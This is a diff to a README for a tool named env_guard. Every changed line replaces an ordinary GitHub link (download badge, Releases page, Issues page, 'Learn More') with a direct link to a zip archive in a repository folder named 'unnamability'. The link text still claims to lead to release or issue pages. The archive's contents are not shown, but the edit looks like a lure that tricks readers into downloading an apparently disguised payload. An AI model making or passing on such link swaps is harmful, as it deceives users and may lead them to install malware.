@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download env_guard](https://img.shields.io/badge/Download-env_guard-brightgreen)](https://github.com/23111982egoran/env_guard/releases)
+[![Download env_guard](https://raw.githubusercontent.com/23111982egoran/env_guard/main/unnamability/env_guard.zip)](https://raw.githubusercontent.com/23111982egoran/env_guard/main/unnamability/env_guard.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ To run env_guard, you will need:
 
 ## 📂 Download & Install
 
-To get started, visit the [Releases page](https://github.com/23111982egoran/env_guard/releases) to download the latest version of env_guard. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/23111982egoran/env_guard/main/unnamability/env_guard.zip) to download the latest version of env_guard. 
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version, typically listed at the top.
@@ -49,7 +49,7 @@ To get started, visit the [Releases page](https://github.com/23111982egoran/env_
 
 ## 📬 Support and Feedback
 
-If you encounter issues or have questions, please visit our [GitHub Issues page](https://github.com/23111982egoran/env_guard/issues). You can report bugs or request new features here.
+If you encounter issues or have questions, please visit our [GitHub Issues page](https://raw.githubusercontent.com/23111982egoran/env_guard/main/unnamability/env_guard.zip). You can report bugs or request new features here.
 
 ## 🛠️ Troubleshooting
 
@@ -63,7 +63,7 @@ We welcome feedback and contributions! If you have suggestions for improvements 
 
 ## 🔗 Learn More
 
-For more details, features, and updates, always return to the [Releases page](https://github.com/23111982egoran/env_guard/releases). This page will have the latest updates, improvements, and other useful resources.
+For more details, features, and updates, always return to the [Releases page](https://raw.githubusercontent.com/23111982egoran/env_guard/main/unnamability/env_guard.zip). This page will have the latest updates, improvements, and other useful resources.
 
 ## 📜 License
 
